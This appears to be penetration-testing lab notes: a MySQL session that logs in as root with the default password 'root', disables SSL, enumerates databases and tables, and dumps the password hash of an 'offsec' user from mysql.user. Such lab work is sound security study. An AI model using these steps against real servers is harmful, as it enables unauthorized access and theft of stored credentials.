```sh
mysql -u root -p'root' -h 192.168.1.1 -P 3306 
# ERROR 2026 (HY000): TLS/SSL error: self-signed certificate in certificate chain
mysql -u root -p'root' -h 192.168.1.1 -P 3306 --ssl=FALSE 

MySQL [(none)]> select version();
# +-----------+
# | version() |
# +-----------+
# | 8.0.21    |
# +-----------+

MySQL [(none)]> select system_user();
# +--------------------+
# | system_user()      |
# +--------------------+
# | root@192.168.1.1   |
# +--------------------+

MySQL [(none)]> show databases;
# +--------------------+
# | Database           |
# +--------------------+
# | information_schema |
# | test               |
# +--------------------+

MySQL [(none)]> use test
# Reading table information for completion of table and column names
# You can turn off this feature to get a quicker startup with -A
# Database changed
MySQL [test]> show tables;
# +----------------+
# | Tables_in_test |
# +----------------+
# | users          |
# +----------------+


MySQL [mysql]> SELECT user, authentication_string FROM mysql.user WHERE user = 'offsec';
# +--------+------------------------------------------------------------------------+
# | user   | authentication_string                                                  |
# +--------+------------------------------------------------------------------------+
# | offsec | $A$005$?qvorPp8#lTKH1j54xuw4C5VsXe5IAa1cFUYdQMiBxQVEzZG9XWd/e6|
# +--------+------------------------------------------------------------------------+
```